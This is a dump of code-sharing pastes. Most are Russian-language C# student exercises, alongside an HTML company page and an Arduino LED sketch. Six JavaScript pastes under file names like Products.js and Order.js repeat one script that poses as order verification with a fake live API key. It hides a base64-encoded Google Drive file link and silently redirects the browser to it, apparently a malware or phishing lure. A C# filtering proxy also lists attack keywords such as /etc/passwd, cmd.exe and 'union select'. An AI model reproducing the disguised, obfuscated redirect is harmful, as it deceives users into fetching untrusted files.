id,title,username,language,date,content
vUs1k5QW,Task1.3,vovanhik_24,C#,Tuesday 8th of April 2025 04:31:26 AM CDT,"using System;
using System.Collections.Generic;
using System.Linq;

namespace LoginAnalyzer
{
    struct LoginAttempt
    {
        public string IP;
        public DateTime Timestamp;

        public LoginAttempt(string ip, DateTime timestamp)
        {
            IP = ip;
            Timestamp = timestamp;
        }
    }

    class Program
    {
        const int Threshold = 5;

        static readonly TimeSpan TimeWindow = TimeSpan.FromMinutes(10);

        static void Main(string[] args)
        {
            List<LoginAttempt> loginAttempts = new List<LoginAttempt>
            {
                new LoginAttempt(""192.168.1.1"", DateTime.Now.AddMinutes(-9)),
                new LoginAttempt(""192.168.1.1"", DateTime.Now.AddMinutes(-8)),
                new LoginAttempt(""192.168.1.1"", DateTime.Now.AddMinutes(-7)),
                new LoginAttempt(""192.168.1.1"", DateTime.Now.AddMinutes(-6)),
                new LoginAttempt(""192.168.1.1"", DateTime.Now.AddMinutes(-5)),
                new LoginAttempt(""192.168.1.1"", DateTime.Now.AddMinutes(-4)),
                new LoginAttempt(""10.0.0.2"", DateTime.Now.AddMinutes(-1)),
                new LoginAttempt(""10.0.0.2"", DateTime.Now.AddMinutes(-1)),
                new LoginAttempt(""10.0.0.2"", DateTime.Now.AddMinutes(-1)),
            };

            DetectSuspiciousActivity(loginAttempts);
        }

        static void DetectSuspiciousActivity(List<LoginAttempt> attempts)
        {
            var groupedByIP = attempts.GroupBy(a => a.IP);

            foreach (var group in groupedByIP)
            {
                string ip = group.Key;

                DateTime now = DateTime.Now;
                var recentAttempts = group
                    .Where(a => now - a.Timestamp <= TimeWindow)
                    .ToList();

                if (recentAttempts.Count >= Threshold)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($""Обнаружено {recentAttempts.Count} попыток входа с IP {ip} за последние 10 минут!"");
                    Console.ResetColor();
                }
                else
                {
                    Console.WriteLine($""IP {ip}: {recentAttempts.Count} попыток входа за последние 10 минут."");
                }
            }
        }
    }
}"
SB6eKmpL,Untitled,Epiphemeral,JavaScript,Tuesday 8th of April 2025 04:24:33 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/65356/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
gMj1JD4T,Products.js,Epiphemeral,JavaScript,Tuesday 8th of April 2025 04:08:43 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/49811/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xYxrNsn6,Task1.2,vovanhik_24,C#,Tuesday 8th of April 2025 03:58:32 AM CDT,"using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Collections.Generic;

namespace Task1_2
{
    public class Program
    {
        static void Main(string[] args)
        {
            int port = 8080;
            TcpListener listener = new TcpListener(IPAddress.Any, port);
            listener.Start();
            Console.WriteLine($""[+] Прокси-сервер запущен на порту {port}..."");

            while (true)
            {
                TcpClient client = listener.AcceptTcpClient();
                Thread thread = new Thread(() => HandleClient(client));
                thread.Start();
            }
        }

        private static readonly List<string> MaliciousPatterns = new List<string>
        {
            ""SQLmap"",
            ""MaliciousHeader"",
            ""/etc/passwd"",
            ""cmd.exe"",
            ""union select""
        };

        private static void HandleClient(TcpClient client)
        {
            using (client)
            {
                try
                {
                    NetworkStream clientStream = client.GetStream();
                    byte[] buffer = new byte[8192];
                    int bytesRead = clientStream.Read(buffer, 0, buffer.Length);

                    if (bytesRead == 0) 
                    {
                        return;
                    }

                    string requestText = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    Console.WriteLine($""[>] Запрос от клиента:\n{requestText.Split('\n')[0]}"");

                    if (IsMalicious(requestText))
                    {
                        Console.WriteLine(""[!] Подозрительный запрос заблокирован!"");
                        string forbiddenResponse = ""HTTP/1.1 403 Forbidden\r\nContent-Length: 0\r\n\r\n"";
                        byte[] responseBytes = Encoding.UTF8.GetBytes(forbiddenResponse);
                        clientStream.Write(responseBytes, 0, responseBytes.Length);
                        return;
                    }

                    ForwardRequest(requestText, clientStream);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($""[x] Ошибка: {ex.Message}"");
                }
            }
        }

        private static bool IsMalicious(string request)
        {
            request = request.ToLower();

            foreach (var pattern in MaliciousPatterns)
            {
                if (request.Contains(pattern.ToLower()))
                {
                    return true;
                }
            }

            return false;
        }

        private static void ForwardRequest(string requestText, NetworkStream clientStream)
        {
            try
            {
                string[] lines = requestText.Split(new[] { ""\r\n"", ""\n"" }, StringSplitOptions.None);
                string hostLine = Array.Find(lines, line => line.StartsWith(""Host:"", StringComparison.OrdinalIgnoreCase));

                if (hostLine == null)
                {
                    Console.WriteLine(""[!] Не удалось определить хост."");
                    return;
                }

                string host = hostLine.Substring(6).Trim();
                int port = 80;

                using (TcpClient server = new TcpClient(host, port))
                using (NetworkStream serverStream = server.GetStream())
                {
                    byte[] requestBytes = Encoding.UTF8.GetBytes(requestText);
                    serverStream.Write(requestBytes, 0, requestBytes.Length);

                    byte[] buffer = new byte[8192];
                    int bytesRead;

                    while ((bytesRead = serverStream.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        clientStream.Write(buffer, 0, bytesRead);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($""[x] Ошибка при пересылке запроса: {ex.Message}"");
            }
        }
    }
}"
ZF3WNiJd,Order.js,Epiphemeral,JavaScript,Tuesday 8th of April 2025 03:53:20 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/32631/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
UzWyWAER,Task1.1,vovanhik_24,C#,Tuesday 8th of April 2025 03:47:02 AM CDT,"using System;
using System.Collections.Generic;
using System.Text;

namespace Task1_1
{
    public class Program
    {
        const int BlockSize = 4;

        static void Main(string[] args)
        {
            Console.Write(""Введите текст для шифрования: "");
            string input = Console.ReadLine() ?? """";

            Console.Write(""Введите ключ (строка): "");
            string keyInput = Console.ReadLine() ?? """";

            byte[] key = GetKeyBytes(keyInput);
            byte[] plaintext = Encoding.UTF8.GetBytes(input);

            byte[] iv = GenerateRandomBlock();
            Console.WriteLine($""IV: {BitConverter.ToString(iv)}"");

            byte[] ciphertext = Encrypt(plaintext, key, iv);
            Console.WriteLine($""Зашифрованный текст (в hex): {BitConverter.ToString(ciphertext)}"");

            byte[] decrypted = Decrypt(ciphertext, key, iv);
            string decryptedText = Encoding.UTF8.GetString(decrypted).TrimEnd('\0');

            Console.WriteLine($""Расшифрованный текст: {decryptedText}"");
        }

        static byte[] GetKeyBytes(string keyInput)
        {
            byte[] keyBytes = new byte[BlockSize];
            byte[] inputBytes = Encoding.UTF8.GetBytes(keyInput);

            for (int i = 0; i < BlockSize; i++)
            {
                keyBytes[i] = i < inputBytes.Length ? inputBytes[i] : (byte)0;
            }

            return keyBytes;
        }

        static byte[] GenerateRandomBlock()
        {
            Random rand = new Random();

            byte[] block = new byte[BlockSize];
            rand.NextBytes(block);
            
            return block;
        }

        static List<byte[]> SplitIntoBlocks(byte[] data)
        {
            List<byte[]> blocks = new List<byte[]>();

            for (int i = 0; i < data.Length; i += BlockSize)
            {
                byte[] block = new byte[BlockSize];
                int remaining = Math.Min(BlockSize, data.Length - i);

                Array.Copy(data, i, block, 0, remaining);
                blocks.Add(block);
            }

            return blocks;
        }

        static byte[] Encrypt(byte[] plaintext, byte[] key, byte[] iv)
        {
            List<byte[]> plainBlocks = SplitIntoBlocks(plaintext);
            List<byte[]> cipherBlocks = new List<byte[]>();

            byte[] prevCipherBlock = iv;

            foreach (var block in plainBlocks)
            {
                byte[] xorWithPrev = XOR(block, prevCipherBlock);
                byte[] cipherBlock = XOR(xorWithPrev, key);

                cipherBlocks.Add(cipherBlock);
                prevCipherBlock = cipherBlock;
            }

            return CombineBlocks(cipherBlocks);
        }

        static byte[] Decrypt(byte[] ciphertext, byte[] key, byte[] iv)
        {
            List<byte[]> cipherBlocks = SplitIntoBlocks(ciphertext);
            List<byte[]> decryptedBlocks = new List<byte[]>();

            byte[] prevCipherBlock = iv;

            foreach (var block in cipherBlocks)
            {
                byte[] xorWithKey = XOR(block, key);
                byte[] plainBlock = XOR(xorWithKey, prevCipherBlock);

                decryptedBlocks.Add(plainBlock);
                prevCipherBlock = block;
            }

            return CombineBlocks(decryptedBlocks);
        }

        static byte[] XOR(byte[] a, byte[] b)
        {
            byte[] result = new byte[BlockSize];

            for (int i = 0; i < BlockSize; i++)
            {
                result[i] = (byte)(a[i] ^ b[i]);
            }

            return result;
        }

        static byte[] CombineBlocks(List<byte[]> blocks)
        {
            List<byte> result = new List<byte>();
            
            foreach (var block in blocks)
            {
                result.AddRange(block);
            }

            return result.ToArray();
        }
    }
}"
CVbuJe4R,Market.js,Epiphemeral,JavaScript,Tuesday 8th of April 2025 03:37:56 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/28994/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
JtUM6yMP,Task 5,vovanhik_24,C#,Tuesday 8th of April 2025 03:34:54 AM CDT,"using System;

namespace Task5
{
    public class Program
    {
        static void Main(string[] args)
        {
            ConvertTo12HourFormat(14, 30);
            ConvertTo12HourFormat(0, 45);
            ConvertTo12HourFormat(12, 0);
            ConvertTo12HourFormat(23, 59);
            ConvertTo12HourFormat(1, 5);
        }

        static void ConvertTo12HourFormat(int hours, int minutes)
        {
            if (hours < 0 || hours > 23 || minutes < 0 || minutes > 59)
            {
                Console.WriteLine(""Некорректное время."");
                return;
            }

            string period = hours < 12 ? ""AM"" : ""PM"";
            int hour12 = hours % 12;

            if (hour12 == 0)
            {
                hour12 = 12;
            }

            Console.WriteLine($""{hour12}:{minutes:D2} {period}"");
        }
    }
}"
UN4AtrRz,Task 4,vovanhik_24,C#,Tuesday 8th of April 2025 03:29:39 AM CDT,"using System;

namespace Task4
{
    public class Program
    {
        static void Main(string[] args)
        {
            int[] numbers = { 4, 1, 9, -3, 7 };

            if (numbers.Length == 0)
            {
                Console.WriteLine(""Массив пуст"");
                return;
            }

            Console.Write(""Массив: "");
            for (int i = 0; i < numbers.Length; i++)
            {
                Console.Write(numbers[i] + "", "");
            }

            int min = FindMin(numbers);
            int max = FindMax(numbers);

            Console.WriteLine($""\nМинимум: {min}\nМаксимум: {max}"");
        }

        static int FindMin(int[] arr)
        {
            int min = arr[0];

            foreach (int num in arr)
            {
                if (num < min)
                {
                    min = num;
                }
            }

            return min;
        }

        static int FindMax(int[] arr)
        {
            int max = arr[0];

            foreach (int num in arr)
            {
                if (num > max)
                {
                    max = num;
                }
            }

            return max;
        }
    }
}"
Dt4vSK0n,Untitled,Epiphemeral,JavaScript,Tuesday 8th of April 2025 03:22:33 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/41629/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
87tSRb0a,Task 3,vovanhik_24,C#,Tuesday 8th of April 2025 03:18:50 AM CDT,"using System;
using System.Collections.Generic;

namespace Task3
{
    public class Program
    {
        static void Main(string[] args)
        {
            int[] inputArray = { 1, 5, 8, 3, 10 };
            int threshold = 5;

            int[] filtered = FilterGreaterThan(inputArray, threshold);

            Console.WriteLine($""Элементы больше {threshold}: {string.Join("", "", filtered)}"");
        }

        public static int[] FilterGreaterThan(int[] arr, int threshold)
        {
            List<int> result = new List<int>();

            foreach (int num in arr)
            {
                if (num > threshold)
                {
                    result.Add(num);
                }
            }

            return result.ToArray();
        }
    }
}"
XqyBZqLV,Task 2,vovanhik_24,C#,Tuesday 8th of April 2025 03:14:41 AM CDT,"using System;
using System.Collections.Generic;

namespace Task2
{
    public class Program
    {
        static void Main(string[] args)
        {
            Console.Write(""Введите строку: "");
            string input = Console.ReadLine() ?? string.Empty; // защита от null

            int uniqueCount = CountUniqueChars(input);

            Console.WriteLine($""Количество уникальных символов в строке \""{input}\"": {uniqueCount}"");
        }

        public static int CountUniqueChars(string word)
        {
            if (string.IsNullOrEmpty(word))
                return 0;

            HashSet<char> uniqueChars = new HashSet<char>();

            foreach (char ch in word)
            {
                uniqueChars.Add(ch);
            }

            return uniqueChars.Count;
        }
    }
}"
5DXqv9z9,Task 1,vovanhik_24,C#,Tuesday 8th of April 2025 02:56:02 AM CDT,"using System;

namespace Task1
{
    class Program
    {
        static void Main()
        {
            Stack stack = new();

            stack.Push(10);
            stack.Push(20);
            stack.Push(30);

            stack.ShowStack();

            Console.WriteLine($""Верхний элемент: {stack.Top()}"");

            stack.Pop();
            stack.ShowStack();

            while (!stack.IsEmpty())
            {
                stack.Pop();
            }

            stack.Pop();
        }

        public class Stack
        {
            private readonly int[] _stackArray;
            private readonly int _capacity;
            private int _topIndex;

            public Stack(int size = 10)
            {
                _capacity = size;
                _stackArray = new int[_capacity];
                _topIndex = -1;
            }

            public bool IsEmpty()
            {
                return _topIndex == -1;
            }

            public void Push(int value)
            {
                if (_topIndex >= _capacity - 1)
                {
                    Console.WriteLine(""Ошибка: стек переполнен."");
                    return;
                }

                _topIndex++;
                _stackArray[_topIndex] = value;

                Console.WriteLine($""Элемент {value} добавлен в стек."");
            }

            public int Pop()
            {
                if (IsEmpty())
                {
                    Console.WriteLine(""Ошибка: стек пуст. Невозможно извлечь элемент."");
                    return 0;
                }

                int value = _stackArray[_topIndex];
                _topIndex--;

                Console.WriteLine($""Элемент {value} удалён из стека."");
                return value;
            }

            public int Top()
            {
                if (IsEmpty())
                {
                    Console.WriteLine(""Ошибка: стек пуст. Нет верхнего элемента."");
                    return 0;
                }

                return _stackArray[_topIndex];
            }

            public void ShowStack()
            {
                if (IsEmpty())
                {
                    Console.WriteLine(""Стек пуст."");
                    return;
                }

                Console.Write(""Содержимое стека: "");
                for (int i = _topIndex; i >= 0; i--)
                {
                    Console.Write($""{_stackArray[i]} "");
                }

                Console.WriteLine();
            }
        }
    }
}"
M606MUcr,Untitled,Ratqueenkslskskwkw,JavaScript,Tuesday 8th of April 2025 01:04:00 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/04943/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xDkG2Vy3,exer p05 plain html,qee20,HTML,Tuesday 8th of April 2025 12:54:50 AM CDT,"<!DOCTYPE html>
<html lang=""en"">
<head>
  <meta charset=""UTF-8"">
  <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
  <title>TechBoard Inc.</title>
  <link rel=""stylesheet"" href=""style.css"">
</head>
<body>
  <header>
    <div class=""container"">
      <h1>TechBoard Inc.</h1>
      <nav>
        <ul>
          <li><a href=""#about"">About</a></li>
          <li><a href=""#products"">Products</a></li>
          <li><a href=""#contact"">Contact</a></li>
        </ul>
      </nav>
    </div>
  </header>

  <section class=""hero"">
    <div class=""container"">
      <h2>Innovating the Future of Motherboards</h2>
      <p>High-performance, reliable, and cutting-edge motherboard solutions for modern computing.</p>
    </div>
  </section>

  <section id=""about"" class=""about"">
    <div class=""container"">
      <h2>About Us</h2>
      <p>TechBoard Inc. is a leading manufacturer of high-quality motherboards, powering computers around the globe with innovation and reliability. Our mission is to deliver superior technology solutions tailored to the demands of gamers, professionals, and businesses.</p>
    </div>
  </section>

  <section id=""products"" class=""products"">
    <div class=""container"">
      <h2>Our Products</h2>
      <div class=""product-grid"">
  
        <div class=""product-card"">
          <img src=""images/tbx500.jpg"" alt=""TBX-500 Pro"">
          <h3>TBX-500 Pro</h3>
          <p>Designed for gamers, with RGB lighting and overclocking support.</p>
          <p class=""price"">$249.99</p>
        </div>
  
        <div class=""product-card"">
          <img src=""images/tbx800.jpg"" alt=""TBX-800 Ultra"">
          <h3>TBX-800 Ultra</h3>
          <p>Enterprise-class reliability for server environments.</p>
          <p class=""price"">$399.99</p>
        </div>
  
        <div class=""product-card"">
          <img src=""images/tbx300.jpg"" alt=""TBX-300 Lite"">
          <h3>TBX-300 Lite</h3>
          <p>Cost-effective and energy-efficient for everyday users.</p>
          <p class=""price"">$129.99</p>
        </div>
  
      </div>
    </div>
  </section>

  <section id=""contact"" class=""contact"">
    <div class=""container"">
      <h2>Contact Us</h2>
      <p>Email: info@techboard.com</p>
      <p>Phone: +1 800 555 1234</p>
      <p>Address: 123 Tech Valley, Silicon City, USA</p>
    </div>
  </section>

  <footer>
    <div class=""container"">
      <p>&copy; 2025 TechBoard Inc. All rights reserved.</p>
    </div>
  </footer>
</body>
</html>
"
nUmzvH5f,Products.js,kammex,JavaScript,Tuesday 8th of April 2025 12:48:33 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/91302/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
TDbPms0v,FastLED - CRGBSet,BurningWreck,C++,Tuesday 8th of April 2025 12:41:53 AM CDT,"// FastLED experiment with Gemini 2.5
// Uses 8 pixel strand with CRGBSet to control two sections
// 4/7/2025

#include <FastLED.h>

// -- Configuration --
#define NUM_LEDS 8        // Total number of LEDs in the strip
#define DATA_PIN 6        // Arduino pin connected to the Neopixel data line
#define LED_TYPE WS2812B  // Type of LED strip (WS2811, WS2812B, etc.)
#define COLOR_ORDER GRB   // Color order for the LED strip (GRB, RGB, etc.)
#define BRIGHTNESS 60     // Set initial brightness (0-255). Start low!

// -- Constants for Effects --
// Blinking Section (LEDs 0-1)
const int BLINK_INTERVAL = 3000;          // milliseconds for first two LEDs

// Effect Section (LEDs 2-7) - Slower, Longer Blinks
const uint8_t TURN_ON_CHANCE = 3;        // Chance (out of 256) per frame for an OFF LED to turn ON. LOW value = infrequent blinks.
const unsigned long MIN_ON_TIME = 800;   // Minimum time (ms) an LED stays ON
const unsigned long MAX_ON_TIME = 2500;  // Maximum time (ms) an LED stays ON

// -- Global Variables --
CRGB leds[NUM_LEDS];      // Array to hold LED color data

// State for LEDs 2-7
struct EffectLedState {
  bool isOn = false;
  unsigned long turnOffTime = 0;
  CRGB color = CRGB::Black;
};
// Create state array only for the effect LEDs (indices 2-7)
// Map physical index (2-7) to state index (0-5)
EffectLedState effectLedStates[NUM_LEDS - 2]; // Size 6 for 6 LEDs

// Timing for blinking section (LEDs 0-1)
unsigned long lastBlinkTime = 0;
bool blinkState = false;       // Current state: true = ON (Red), false = OFF (Black)

// -- Setup Function --
void setup() {
  Serial.begin(9600);
  delay(2000); // Give serial time to connect
  Serial.println(""\n\nFastLED: Slow/Long Random Blinks"");

  randomSeed(analogRead(0)); // Seed random number generator

  FastLED.addLeds<LED_TYPE, DATA_PIN, COLOR_ORDER>(leds, NUM_LEDS)
         .setCorrection(TypicalLEDStrip);
  FastLED.setBrightness(BRIGHTNESS);
  FastLED.clear(); // Initialize all LEDs to off
  FastLED.show();
  delay(50);
  Serial.println(""Setup complete. Starting loop..."");
}

// -- Main Loop --
void loop() {
  updateBlinkingSection();     // Update state for LEDs 0, 1
  updateSlowRandomBlinkSection(); // Update state for LEDs 2-7

  // Send the combined state of the 'leds' array to the strip
  FastLED.show();

  // Keep delay for overall frame rate control
  FastLED.delay(16); // Roughly 60 frames per second
}

// -- Update Functions --

// Function to handle the first two LEDs (blinking red) - UNCHANGED
void updateBlinkingSection() {
  unsigned long currentTime = millis();
  if (currentTime - lastBlinkTime >= BLINK_INTERVAL) {
    lastBlinkTime = currentTime;
    blinkState = !blinkState;
  }
  if (blinkState) {
    leds[0] = CRGB::Red;
    leds[1] = CRGB::Red;
  } else {
    leds[0] = CRGB::Black;
    leds[1] = CRGB::Black;
  }
}

// Function to handle LEDs 2-7 (slow, long random blinking colors) - NEW LOGIC
void updateSlowRandomBlinkSection() {
  unsigned long currentTime = millis();

  // Loop through effect section LEDs (indices 2 to NUM_LEDS-1)
  for (int i = 2; i < NUM_LEDS; i++) {
    int stateIndex = i - 2; // Map LED index (2-7) to state array index (0-5)

    // --- Check LED state ---
    if (effectLedStates[stateIndex].isOn) {
      // --- LED is currently ON ---
      // Check if its time to turn OFF
      if (currentTime >= effectLedStates[stateIndex].turnOffTime) {
         effectLedStates[stateIndex].isOn = false; // Update state
         leds[i] = CRGB::Black;                   // Set physical LED off
         effectLedStates[stateIndex].color = CRGB::Black; // Clear stored color
      } else {
         // Still ON - ensure the physical LED has the correct color
         // (This handles cases where it might have been accidentally turned off)
         leds[i] = effectLedStates[stateIndex].color;
      }

    } else {
      // --- LED is currently OFF ---
      // Give it a very small chance to turn ON
      if (random8() < TURN_ON_CHANCE) {
          // Calculate ON duration
          unsigned long onDuration = random(MIN_ON_TIME, MAX_ON_TIME + 1); // random() excludes upper bound

          // Update state
          effectLedStates[stateIndex].isOn = true;
          effectLedStates[stateIndex].turnOffTime = currentTime + onDuration;
          effectLedStates[stateIndex].color = CHSV(random8(), 220, 255); // New random color (slightly less saturated)

          // Set physical LED ON
          leds[i] = effectLedStates[stateIndex].color;
      }
       // else: LED remains OFF (leds[i] should be Black)
    }
  } // End loop through effect LEDs
}"
